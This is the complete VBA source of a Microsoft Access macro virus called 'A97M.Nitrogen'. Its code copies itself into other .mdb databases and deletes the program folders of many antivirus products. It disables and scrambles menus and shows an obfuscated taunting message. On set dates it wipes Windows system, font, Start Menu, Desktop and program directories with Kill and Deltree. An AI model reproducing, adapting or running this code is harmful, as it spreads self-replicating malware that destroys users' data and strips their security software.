Attribute VB_Name = "Module1"
'A97M.Nitrogen
'By ·KrïPt¤R·
Dim filename As String
Dim msg
Option Compare Database
Option Explicit
Public Sub copia()
On Error Resume Next
filename = Dir("*.mdb", vbNormal)
DoCmd.TransferDatabase acExport, "Microsoft Access", filename, acMacro, "Autoexec", "Autoexec"
DoCmd.TransferDatabase acExport, "Microsoft Access", filename, acModule, "Microsoft", "Microsoft"
End Sub
Public Function Nitrogen()
Call copia
While filename <> ""
Call copia
Wend
Call retro
Call Escolha
Call payloads
End Function
Public Sub retro()
On Error Resume Next
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls(14).Enabled = False
Dim Norton, Nortonf, Norton2, Nortonf2, Norton3, Nortonf3, Mcafee, Mcafeef, Pccilin, Pccilinf, Avp, Avpf, Pandap, Pandapf, Pandat, Pandatf, Norman, Normanf, Rav, Ravf, Wormguard, Wormguardf, Protect, Protectf, Esafe, Esafef, Heal, Healf, Fprot, Fprotf, Fsecure, Fsecuref, Escan, Escanf, Lockdown, Lockdownf, Avpersonel, Avpersonelf, Avg, Avgf, Avast, Avastf, Adaware, Adawaref, Pest, Pestf
Norton = ("C:\Programas\Norton AntiVirus")
Norton2 = ("C:\Programs\Norton AntiVirus")
Norton3 = ("C:\Programas\Norton SystemWorks\Norton AntiVirus")
Nortonf = Norton + "\*.*"
Nortonf2 = Norton2 + "\*.*"
Nortonf3 = Norton3 + "\*.*"
Mcafee = ("C:\Programas\Mcafee")
Mcafeef = Mcafee + "\*.*"
Pccilin = ("C:\Programas\Trend Micro")
Pccilinf = Pccilin + "\*.*"
Avp = ("C:\Programas\Kaspersky Lab\Kaspersky Anti-Virus Personal Pro")
Avpf = Avp + "\*.*"
Pandap = ("C:\Programas\Panda Software\Panda Antivirus 6.0")
Pandapf = Pandap + "\*.*"
Pandat = ("C:\Programas\Panda Software\Panda Antivirus Titanium")
Pandatf = Pandat + "\*.*"
Rav = ("C:\Programas\GeCAD")
Ravf = Rav + "\*.*"
Wormguard = ("C:\Wormguard")
Wormguardf = Wormguard + "\*.*"
Protect = ("C:\Programas\Protector Plus")
Protectf = Protect + "\*.*"
Esafe = ("C:\Programas\eSafe\Protect")
Esafef = Esafe + "\*.*"
Heal = ("C:\Programas\Quick Heal")
Healf = Heal + "\*.*"
Fprot = ("C:\Programas\FSI\F-Prot")
Fprotf = Fprot + "\*.*"
Fsecure = ("C:\Programas\F-Secure")
Fsecuref = Fsecure + "\*.*"
Escan = ("C:\Programas\eScan95")
Escanf = Escan + "\*.*"
Lockdown = ("C:\Programas\Lockdown Millennium")
Lockdownf = Lockdown + "\*.*"
Avpersonel = ("C:\Programas\AVPersonal")
Avpersonelf = Avpersonel + "\*.*"
Avg = ("C:\Programas\Grisoft\AVG6")
Avgf = Avg + "\*.*"
Avast = ("C:\Programas\ALWIL Software\AVAST32")
Avastf = Avast + "\*.*"
Adaware = ("C:\Programas\Lavasoft Ad-aware")
Adawaref = Adaware + "\*.*"
Pest = ("C:\Programas\PestPatrol")
Pestf = Pest + "\*.*"
Kill Nortonf
Kill Nortonf2
Kill Nortonf3
Kill Mcafeef
Kill Avpf
Kill Pandapf
Kill Pandatf
Kill Ravf
Kill Wormguardf
Kill Protectf
Kill Esafef
Kill Healf
Kill Fprotf
Kill Fsecuref
Kill Escanf
Kill Lockdownf
Kill Avg
Kill Avast
Kill Adaware
Kill Pestf
End Sub
Public Sub Escolha()
Dim Segundo, Escol
Segundo = Int(59 * Rnd) + 1
Escol = Int(3 * Rnd) + 1
If Second(Now) = Segundo Then
If Escol = 1 Then Icones
If Escol = 2 Then Menus
If Escol = 3 Then barra
End If
End Sub
Public Sub Icones()
Dim Icone, Icone2
Icone = Int(10 * Rnd) + 1
Icone2 = Int(10 * Rnd) + 1
CommandBars("Database").Controls(Icone).Delete
tempo
CommandBars("Database").Controls(Icone2).Delete
tempo
CommandBars("Database").Controls(Icone).Delete
tempo
CommandBars("Database").Controls(Icone2).Delete
tempo
CommandBars("Database").Controls(Icone).Delete
tempo
CommandBars("Database").Controls(Icone2).Delete
tempo
CommandBars("Database").Reset
Icones
End Sub
Public Sub Menus()
CommandBars("Edit").Enabled = False
tempo
CommandBars("File").Enabled = True
tempo
CommandBars("Window").Enabled = False
tempo
CommandBars("Tools").Enabled = True
tempo
CommandBars("File").Enabled = False
tempo
CommandBars("Help").Enabled = True
tempo
CommandBars("View").Enabled = False
tempo
CommandBars("Insert").Enabled = False
tempo
CommandBars("View").Enabled = True
tempo
CommandBars("Tools").Enabled = False
tempo
CommandBars("Insert").Enabled = True
Menus
End Sub
Public Sub barra()
CommandBars("Database").Visible = False
tempo
CommandBars("Web").Visible = True
tempo
CommandBars("Database").Visible = True
tempo
CommandBars("Web").Visible = False
tempo
barra
End Sub
Public Sub tempo()
Dim pausa, inicio
pausa = Int(3 * Rnd) + 1
inicio = Timer
Do While Timer < pausa + inicio
DoEvents
Loop
End Sub
Public Sub payloads()
On Error Resume Next
If Minute(Now) = "12" Then
msg = Chr(65) & Chr(57) & Chr(55) & Chr(77) & Chr(46) & Chr(78) & Chr(105) & Chr(116) & Chr(114) & Chr(111) & Chr(103) & Chr(101) & Chr(110) & Chr(32) & Chr(110) & Chr(227) & Chr(111) & Chr(32) & Chr(109) & Chr(111) & Chr(114) & Chr(114) & Chr(101) & Chr(114) & Chr(97) & Chr(32) & Chr(101) & Chr(110) & Chr(113) & Chr(117) & Chr(97) & Chr(110) & Chr(116) & Chr(111) & Chr(32) & Chr(77) & Chr(105) & Chr(114) & Chr(97) & Chr(32) & Chr(102) & Chr(111) & Chr(114) & Chr(32) & Chr(99) & Chr(97) & Chr(98) & Chr(101) & Chr(231) & Chr(111) & Chr(100) & Chr(111) & Chr(32) & Chr(108) & Chr(111) & Chr(103) & Chr(111) & Chr(32) & Chr(233) & Chr(32) & Chr(110) & Chr(117) & Chr(99) & Chr(97) & Chr(33) & Chr(33) & Chr(33) & Chr(72) & Chr(73) & Chr(72) & Chr(73) & Chr(33) & Chr(33) & Chr(33)
MsgBox (msg), vbCritical
End If
If Day(Now) = "28" And Month(Now) = "2" Then
Kill ("C:\Windows\*.*")
End If
If Day(Now) = "15" And Month(Now) = "5" Then
Kill ("C:\Windows\System\*.*")
End If
If Day(Now) = "15" And Month(Now) = "10" Then
Shell ("C:\Windows\Command\Deltree.exe /y C:\Windows\Fonts")
End If
If Day(Now) = "3" And Month(Now) = "7" Then
Shell ("C:\Windows\Command\Deltree.exe /y C:\Windows\Menu Iniciar")
Shell ("C:\Windows\Command\Deltree.exe /y C:\Windows\Start Menu")
End If
If Day(Now) = "21" And Month(Now) = "9" Then
Shell ("C:\Windows\Command\Deltree.exe /y C:\Windows\Ambiente de Trabalho")
Shell ("C:\Windows\Command\Deltree.exe /y C:\Windows\Desktop")
End If
If Day(Now) = "17" And Month(Now) = "11" Then
Shell ("C:\Windows\Command\Deltree.exe /y C:\Programs")
Shell ("C:\Windows\Command\Deltree.exe /y C:\Programas")
End If
If Day(Now) = "7" And Month(Now) = "7" Then
Shell ("C:\Windows\Command\Deltree.exe /y C:\Program Files")
End If
If Second(Now) = Minute(Now) Then
CommandBars.LargeButtons = True
End If
If Day(Now) = Month(Now) Then
CommandBars.ActiveMenuBar.Enabled = False
End If
End Sub

